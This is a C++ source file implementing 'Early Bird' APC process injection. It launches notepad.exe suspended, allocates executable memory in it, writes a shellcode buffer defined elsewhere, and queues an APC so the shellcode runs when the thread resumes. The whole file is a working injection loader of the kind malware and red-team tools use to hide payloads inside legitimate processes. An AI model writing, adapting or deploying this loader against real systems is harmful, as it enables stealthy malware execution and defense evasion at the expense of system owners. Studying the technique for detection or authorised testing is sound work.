#include "utils.h"
#include "early_bird_injection.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>


void EarlyBirdInjection() {
	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	PROCESS_INFORMATION procInfo;

	printf("[+] Creating Notepad.exe as Suspended Process.\n");
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);

    SIZE_T shellcodeSize = sizeof(sc);

    // 4. Allocate memory in the target process
    LPVOID remoteMemory = VirtualAllocEx(procInfo.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteMemory) {
        std::cerr << "Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        TerminateProcess(procInfo.hProcess, 1);
        return;
    }

    // 5. Write the shellcode to the allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(procInfo.hProcess, remoteMemory, sc, shellcodeSize, &bytesWritten)) {
        std::cerr << "Failed to write shellcode to the target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        return;
    }

    // 6. Queue an APC to the main thread of the target process
    if (!QueueUserAPC((PAPCFUNC)remoteMemory, procInfo.hThread, NULL))  // The shellcode address
    {
        std::cerr << "Failed to queue APC. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        return;
    }

    // 7. Resume the main thread to trigger the APC and execute the shellcode
    if (ResumeThread(procInfo.hThread) == -1) {
        std::cerr << "Failed to resume thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        return;
    }

    std::cout << "Shellcode injected and executed successfully." << std::endl;

    // 8. Cleanup
    CloseHandle(procInfo.hThread);
    CloseHandle(procInfo.hProcess);
}